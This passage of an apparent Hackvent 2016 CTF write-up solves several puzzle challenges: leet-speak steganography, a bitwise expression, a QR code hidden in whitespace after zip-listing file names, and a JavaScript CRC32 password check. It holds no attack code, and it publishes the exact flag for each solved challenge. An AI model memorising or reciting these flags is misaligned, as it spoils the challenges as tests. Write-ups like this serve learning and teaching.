+The advantage of steganography over cryptography alone is that the intended secret message does not attract attention to itself as an object of scrutiny. plainly visible encrypted messages - no matter how unbreakable - arouse interest, and may in themselves be incriminating in countries where encryption is illegal. thus, whereas cryptography is the practice of protecting the contents of a message alone, steganography is concerned with concealing the fact that a secret message is being sent, as well as concealing the contents of the message.
+Steganography includes the concealment of information within computer files. in digital steganography, electronic communications may include steganographic coding inside of a transport layer, such as a document file, image file, program or protocol. media files are ideal for steganographic transmission because of their large size. for example, a sender might start with an innocuous image file and adjust the color of every hundredth pixel to correspond to a letter in the alphabet, a change so subtle that someone not specifically looking for it is unlikely to notice it.
+</pre></table></code></div></div><p>nothing obvious in there so should be more to it, the hint said something about this not being as consistent as it should be.. hmm</p><p>most letters appear both in regular form and in leet form, maybe that is hiding some more info, for the first couple words, noting a <code class="language-plaintext highlighter-rouge">1</code> if the letter was written in leet and a <code class="language-plaintext highlighter-rouge">0</code> otherwise gives:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>00101101 00101101 00101101 00101101 00101101
+</pre></table></code></div></div><p>This is the same pattern (<code class="language-plaintext highlighter-rouge">-</code> symbol in ascii) repeated, this must be intentional, let’s apply it to the entire message:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre>00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+001011010010110100101101001011010010110100101101
+
+01001000010101100011000100110110001011010100111100110111011011110100100100101101
+01010111001100110011010001101010001011010100001001001010010010000011011100101101
+01100011010100110111011001101011001011010110010100110101010010000111101000101101
+
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+00101101001011010010110100101101001011010010110100101101001011010010110100101101
+001011010010110100101101001011010010
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>--------------------------------------------------------------
+--------------HV16-O7oI-W34j-BJH7-cSvk-e5Hz-------------------
+--------------------------------------------------------------
+--------------
+</pre></table></code></div></div><h2> Flag</h2><code> HV16-O7oI-W34j-BJH7-cSvk-e5Hz </code><hr><h1 id="dec-5-boolean-fun"> Dec 5: Boolean Fun <a href="/CTF-writeups-public/writeups/Hackvent_2016/05-dec-5-boolean-fun.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Santa found a paper with some strange logical stuff on it. On the back of it there is the hint: “use 32 bit”.</p><p>He has no clue what this means - can you show him, what “???” should be?</p><p><img src="writeupfiles/dec5_chall.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Just some bitwise logic operators, we can calculate answer in python as follows:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>$ python
+&gt;&gt;&gt; ~((4 | 7) ^ (1337 &amp; 424242)) | 0xb055
+-291
+</pre></table></code></div></div><p>Put <code class="language-plaintext highlighter-rouge">-291</code> in Ball-o-matic to get the bauble with the nugget</p><p><img src="writeupfiles/ball_dec5.png" alt="" /></p><h2> Flag</h2><code> HV16-2wGq-wOX3-T2oe-n8si-hZ0A </code><hr><h1 id="dec-6-back-2-work"> Dec 6: Back 2 Work <a href="/CTF-writeups-public/writeups/Hackvent_2016/06-dec-6-back-2-work.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Greetings from Thumper, he has an order for you:</p><ol><li>unzip: the password is confidential<li>find the flag<li>look at my holiday pictures</ol><p>Comment: Be aware, the pictures are only supplement.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We get a zip file with 25 images in them, the images are of hacky easter bunny but the hint says the images are not important. So we focus on the zip file itself</p><p>We can extract it with password <code class="language-plaintext highlighter-rouge">confidential</code> but see nothing strange.</p><p>we get some information about the zip file</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+</pre><td class="rouge-code"><pre>$ unzip -v dec6_original.zip                                                                                                           [06-12-16 15:51:45]
+Archive:  dec6_original.zip
+ Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
+--------  ------  ------- ---- ---------- ----- --------  ----
+  822192  Defl:N   821475   0% 2016-09-07 22:30 9ac20439  image_0004.jpg
+                                                    -
+  649281  Defl:N   648888   0% 2016-09-07 22:30 34b1e9c3  image_0005.jpg
+                                                                   -
+  774896  Defl:N   774435   0% 2016-09-07 22:30 764cdcab  image_0017.jpg
+                                                             -
+  658523  Defl:N   657723   0% 2016-09-07 22:30 17038f5a  image_0002.jpg
+                                                    -
+  584984  Defl:N   584386   0% 2016-09-07 22:30 a2a99aad  image_0013.jpg
+                                                             -
+  639489  Defl:N   639014   0% 2016-09-07 22:30 8a3db508  image_0012.jpg
+                                                                      -
+  916283  Defl:N   915157   0% 2016-09-07 22:30 14a76079  image_0016.jpg
+                                           -
+  684503  Defl:N   684052   0% 2016-09-07 22:30 1de58966  image_0010.jpg
+                                                                                     -
+  608586  Defl:N   607823   0% 2016-09-07 22:30 2e7804b3  image_0009.jpg
+                                              -
+  963456  Defl:N   962651   0% 2016-09-07 22:30 fdd724e0  image_0020.jpg
+                                                                -
+  695994  Defl:N   695208   0% 2016-09-07 22:30 b370cb8a  image_0018.jpg
+                                                             -
+  760741  Defl:N   759912   0% 2016-09-07 22:30 3e75e394  image_0001.jpg
+                                                                -
+  716152  Defl:N   715332   0% 2016-09-07 22:30 9735af02  image_0003.jpg
+                                                          -
+  772244  Defl:N   771129   0% 2016-09-07 22:30 8c123698  image_0006.jpg
+                                                                -
+  885418  Defl:N   884858   0% 2016-09-07 22:30 cc732eaa  image_0015.jpg
+                                              -
+  484512  Defl:N   482635   0% 2016-09-07 22:30 6aa90f1a  image_0011.jpg
+                                                                -
+  819398  Defl:N   818968   0% 2016-09-07 22:30 696689ab  image_0024.jpg
+                                                       -
+ 1104273  Defl:N  1102447   0% 2016-09-07 22:30 6fb877ce  image_0007.jpg
+                                                                            -
+ 1163165  Defl:N  1162154   0% 2016-09-07 22:30 8774fd48  image_0021.jpg
+                                                    -
+  719580  Defl:N   718391   0% 2016-09-07 22:30 447933be  image_0023.jpg
+                                                                            -
+  766740  Defl:N   765316   0% 2016-09-07 22:30 38213aab  image_0019.jpg
+                                           -
+  829079  Defl:N   828267   0% 2016-09-07 22:30 35e8aea8  image_0025.jpg
+                                              -
+ 1004991  Defl:N  1003782   0% 2016-09-07 22:30 16cfccc6  image_0022.jpg
+                                                                -
+  792701  Defl:N   790543   0% 2016-09-07 22:30 87b0e0b0  image_0008.jpg
+                                                             -
+ 1362659  Defl:N  1361655   0% 2016-09-07 22:30 01264369  image_0014.jpg
+                                                       -
+--------          -------  ---                            -------
+20179840         20156201   0%                            25 files
+</pre></table></code></div></div><p>We see that there is whitespace (spaces and tabs) after each file name here.</p><p>We open the zip file in a hex editor and see the following character after each file name in the listing:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre>20 20 20 20 20 20 20 09 09 09 09 09 20 09 20 09 09 09 20 20 20 20 20 20 20
+20 09 09 09 09 09 20 09 20 09 20 09 20 20 20 20 20 09 20 09 09 09 09 09 20
+20 09 20 20 20 09 20 09 09 09 09 20 09 09 20 20 09 09 20 09 20 20 20 09 20
+20 09 20 20 20 09 20 09 20 20 20 20 20 09 20 09 09 09 20 09 20 20 20 09 20
+20 09 20 20 20 09 20 09 09 20 09 09 09 20 09 09 20 09 20 09 20 20 20 09 20
+20 09 09 09 09 09 20 09 20 20 09 09 20 20 20 20 09 09 20 09 09 09 09 09 20
+20 20 20 20 20 20 20 09 20 09 20 09 20 09 20 09 20 09 20 20 20 20 20 20 20
+09 09 09 09 09 09 09 09 09 20 20 09 20 09 20 09 20 09 09 09 09 09 09 09 09
+20 20 20 20 20 09 20 20 20 20 09 20 20 20 09 20 20 20 09 20 09 20 09 20 09
+20 09 20 20 20 20 09 09 09 09 20 20 09 20 09 20 20 09 09 09 09 20 09 20 09
+20 09 20 20 09 09 20 09 20 09 20 09 09 09 20 20 20 20 09 20 20 09 09 09 20
+09 09 09 20 20 20 09 09 09 09 09 20 09 09 20 20 20 20 20 20 20 20 09 09 09
+09 09 09 20 20 20 20 20 20 20 20 09 09 09 20 09 09 20 20 09 09 09 20 20 20
+20 20 20 09 20 09 09 20 09 09 09 20 20 09 20 09 09 20 09 20 09 09 09 20 20
+20 09 20 09 20 20 20 20 20 20 09 09 20 20 09 20 20 09 20 20 09 20 20 20 20
+20 09 09 20 20 20 09 20 09 20 09 20 09 09 09 20 09 20 09 09 20 20 09 09 20
+20 09 09 20 09 20 20 09 09 20 20 09 09 09 20 20 20 20 20 20 20 20 20 09 09
+09 09 09 09 09 09 09 09 20 20 20 09 09 09 20 09 20 09 09 09 20 09 20 09 20
+20 20 20 20 20 20 20 09 20 09 20 09 09 20 20 09 20 09 20 09 20 09 09 20 20
+20 09 09 09 09 09 20 09 09 09 09 09 09 09 20 20 20 09 09 09 20 09 09 20 20
+20 09 20 20 20 09 20 09 20 09 20 20 20 20 20 20 20 20 20 20 20 09 20 20 09
+20 09 20 20 20 09 20 09 20 20 09 20 20 09 20 09 20 20 20 20 09 20 20 20 20
+20 09 20 20 20 09 20 09 20 20 20 09 09 09 09 09 20 09 20 20 09 09 09 09 20
+20 09 09 09 09 09 20 09 20 09 20 09 20 09 20 20 20 20 20 20 09 20 09 09 20
+20 20 20 20 20 20 20 09 20 20 09 09 09 20 09 09 09 09 20 09 20 09 20 20 20
+</pre></table></code></div></div><p>When we replace these values with other characters, we notice it looks like it could represent a QR code</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre>0000000     0 0   0000000
+0     0 0 0 00000 0     0
+0 000 0    0  00  0 000 0
+0 000 0 00000 0   0 000 0
+0 000 0  0   0  0 0 000 0
+0     0 00  0000  0     0
+0000000 0 0 0 0 0 0000000
+         00 0 0 0
+00000 0000 000 000 0 0 0
+0 0000    00 0 00    0 0
+0 00  0 0 0   0000 00   0
+   000     0  00000000
+   00000000   0  00   000
+000 0  0   00 0  0 0   00
+0 0 000000  00 00 00 0000
+0  000 0 0 0   0 0  00  0
+0  0 00  00   000000000
+        000   0 0   0 0 0
+0000000 0 0  00 0 0 0  00
+0     0       000   0  00
+0 000 0 0 00000000000 00
+0 000 0 00 00 0 0000 0000
+0 000 0 000     0 00    0
+0     0 0 0 0 000000 0  0
+0000000 00   0    0 0 000
+</pre></table></code></div></div><p>So we write a little script to convert theses values to a QR code</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+<span class="kn">from</span> <span class="n">qrtools</span> <span class="kn">import</span> <span class="n">QR</span>
+
+<span class="n">qrcode</span><span class="o">=</span><span class="sh">"</span><span class="s">0000000111110101110000000011111010101000001011111001000101111011001101000100100010100000101110100010010001011011101101010001001111101001100001101111100000000101010101010000000111111111001010101111111100000100001000100010101010100001111001010011110101010011010101110000100111011100011111011000000001111110000000011101100111000000101101110010110101110001010000001100100100100000110001010101110101100110011010011001110000000001111111111000111010111010100000000101011001010101100011111011111110001110110001000101010000000000010010100010100100101000010000010001010001111101001111001111101010101000000101100000000100111011110101000</span><span class="sh">"</span>
+<span class="n">outimgname</span> <span class="o">=</span> <span class="sh">"</span><span class="s">dec6_qrcode.png</span><span class="sh">"</span>
+
+<span class="n">outimg</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span> <span class="sh">'</span><span class="s">RGB</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="mi">25</span><span class="p">,</span><span class="mi">25</span><span class="p">),</span> <span class="sh">"</span><span class="s">white</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">pixels_out</span> <span class="o">=</span> <span class="n">outimg</span><span class="p">.</span><span class="nf">load</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="n">qrcode</span><span class="p">)):</span>
+    <span class="k">if</span> <span class="n">qrcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">:</span>
+        <span class="n">pixels_out</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="mi">25</span><span class="p">,</span><span class="n">i</span><span class="o">/</span><span class="mi">25</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">outimg</span><span class="o">=</span><span class="n">outimg</span><span class="p">.</span><span class="nf">resize</span><span class="p">((</span><span class="mi">250</span><span class="p">,</span><span class="mi">250</span><span class="p">))</span>
+<span class="n">outimg</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">outimgname</span><span class="p">,</span><span class="sh">"</span><span class="s">png</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">myCode</span> <span class="o">=</span> <span class="nc">QR</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="n">outimgname</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">myCode</span><span class="p">.</span><span class="nf">decode</span><span class="p">():</span>
+    <span class="k">print</span> <span class="n">myCode</span><span class="p">.</span><span class="nf">data_to_string</span><span class="p">()</span>
+</pre></table></code></div></div><p>This outputs the following QR code and the nugget</p><p><img src="writeupfiles/dec6_qrcode.png" alt="" /></p><h2> Flag</h2><code> HV16-y9YO-sDo1-Vi7O-RWq1-V7hN </code><hr><h1 id="dec-7-trivialkrypto-1-42"> Dec 7: TrivialKRYPTO 1.42 <a href="/CTF-writeups-public/writeups/Hackvent_2016/07-dec-7-trivialkrypto-142.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><em>You think you need the password?</em></p><p>Today’s present is encrypted. Luckily Santa did not use Kryptochef’s KRYPTO 2.0 so there might be a slight chance of recovering it?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The button leads to a site with a password field and this in the source:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+</pre><td class="rouge-code"><pre><span class="nt">&lt;title&gt;</span>TrivialCrypt<span class="nt">&lt;/title&gt;</span>
+
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"pass"</span> <span class="na">placeholder=</span><span class="s">"password"</span> <span class="nt">/&gt;&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">id=</span><span class="s">"decrypt"</span> <span class="na">value=</span><span class="s">"decrypt"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;p</span> <span class="na">id=</span><span class="s">"out"</span><span class="nt">&gt;</span>enter password ...<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nx">s3cr3t</span><span class="o">=</span><span class="p">[</span><span class="mi">2155568001</span><span class="p">,</span><span class="mi">3847164610</span><span class="p">,</span><span class="mi">2684356740</span><span class="p">,</span><span class="mi">2908571526</span><span class="p">,</span><span class="mi">2557362074</span><span class="p">,</span><span class="mi">2853440707</span><span class="p">,</span><span class="mi">3849194977</span><span class="p">,</span><span class="mi">3171764887</span><span class="p">];</span>
+<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">decrypt</span><span class="dl">'</span><span class="p">).</span><span class="nx">onclick</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+<span class="kd">var</span> <span class="nx">pass</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pass</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+
+<span class="kd">var</span> <span class="nx">s</span><span class="o">=</span><span class="dl">""</span><span class="p">;</span>
+<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">s3cr3t</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+<span class="kd">var</span> <span class="nx">pp</span><span class="o">=</span><span class="dl">""</span><span class="p">;</span>
+<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">(</span><span class="nx">s3cr3t</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">^</span> <span class="nf">crc32</span><span class="p">(</span><span class="nx">pass</span><span class="p">));</span> <span class="nx">p</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">;</span> <span class="nx">p</span><span class="o">&gt;&gt;=</span><span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+<span class="nx">pp</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">p</span><span class="o">&amp;</span><span class="mh">0xFF</span><span class="p">)</span><span class="o">+</span><span class="nx">pp</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nx">s</span><span class="o">+=</span><span class="nx">pp</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">out</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">out</span><span class="dl">'</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nf">crc32</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2343675265</span><span class="p">){</span>
+<span class="nx">out</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">right</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">out</span><span class="p">.</span><span class="nx">firstChild</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="nx">s</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+<span class="nx">out</span><span class="p">.</span><span class="nx">className</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">wrong</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">out</span><span class="p">.</span><span class="nx">firstChild</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">wrong password ...</span><span class="dl">"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">makeCRCTable</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="kd">var</span> <span class="nx">c</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">crcTable</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">n</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nx">n</span><span class="o">++</span><span class="p">){</span>
+        <span class="nx">c</span> <span class="o">=</span> <span class="nx">n</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">k</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="nx">k</span><span class="o">++</span><span class="p">){</span>
+            <span class="nx">c</span> <span class="o">=</span> <span class="p">((</span><span class="nx">c</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">)</span> <span class="p">?</span> <span class="p">(</span><span class="mh">0xEDB88320</span> <span class="o">^</span> <span class="p">(</span><span class="nx">c</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">1</span><span class="p">))</span> <span class="p">:</span> <span class="p">(</span><span class="nx">c</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">1</span><span class="p">));</span>
+        <span class="p">}</span>
+        <span class="nx">crcTable</span><span class="p">[</span><span class="nx">n</span><span class="p">]</span> <span class="o">=</span> <span class="nx">c</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">crcTable</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">crc32</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">crcTable</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">crcTable</span> <span class="o">||</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">crcTable</span> <span class="o">=</span> <span class="nf">makeCRCTable</span><span class="p">());</span>
+    <span class="kd">var</span> <span class="nx">crc</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">^</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">str</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="nx">crc</span> <span class="o">=</span> <span class="p">(</span><span class="nx">crc</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">^</span> <span class="nx">crcTable</span><span class="p">[(</span><span class="nx">crc</span> <span class="o">^</span> <span class="nx">str</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="k">return </span><span class="p">((</span><span class="nx">crc</span><span class="o">&amp;</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nt">&lt;/script&gt;</span>
+</pre></table></code></div></div><p>This was re-organised into a simplified javascript only file which can be run with node:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">makeCRCTable</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="kd">var</span> <span class="nx">c</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">crcTable</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">n</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nx">n</span><span class="o">++</span><span class="p">){</span>
+        <span class="nx">c</span> <span class="o">=</span> <span class="nx">n</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">k</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="nx">k</span><span class="o">++</span><span class="p">){</span>
+            <span class="nx">c</span> <span class="o">=</span> <span class="p">((</span><span class="nx">c</span><span class="o">&amp;</span><span class="mi">1</span><span class="p">)</span> <span class="p">?</span> <span class="p">(</span><span class="mh">0xEDB88320</span> <span class="o">^</span> <span class="p">(</span><span class="nx">c</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">1</span><span class="p">))</span> <span class="p">:</span> <span class="p">(</span><span class="nx">c</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">1</span><span class="p">));</span>
+        <span class="p">}</span>
+        <span class="nx">crcTable</span><span class="p">[</span><span class="nx">n</span><span class="p">]</span> <span class="o">=</span> <span class="nx">c</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">crcTable</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">crc32</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
